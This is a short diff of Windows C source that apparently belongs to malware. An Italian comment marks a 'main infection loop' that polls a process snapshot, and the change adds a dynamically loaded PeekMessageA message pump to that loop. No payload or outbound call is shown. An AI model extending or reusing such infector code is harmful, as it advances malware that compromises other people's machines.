@@ -102,6 +102,23 @@ BOOL IsToBypass(WCHAR *p_name)
 	return FALSE;
 }
 
+typedef BOOL (WINAPI *PeekMessage_t)(LPMSG, HWND, UINT, UINT, UINT);
+void HandleMessages()
+{
+	static PeekMessage_t pPeekMessage = NULL;
+	MSG sm_msg; 
+	HMODULE	huser;
+
+	if (!pPeekMessage) {
+		if (!(huser = LoadLibraryW(L"User32.dll")))
+			return;
+		if (!(pPeekMessage = (PeekMessage_t)GetProcAddress(huser, "PeekMessageA")))
+			return;
+	}
+	
+	pPeekMessage(&sm_msg, NULL, 0, 0, PM_REMOVE);
+}
+
 // Ciclo principale di infezione
 #define HM_PTSLEEPTIME 500
 void StartPolling(void)
@@ -133,7 +150,8 @@ void StartPolling(void)
 			}
 			CloseHandle( hProcessSnap );
 		}
-		HANDLE_SENT_MESSAGES(wait_time);
+		HandleMessages();
+		Sleep(wait_time);
 	} 
 }
 
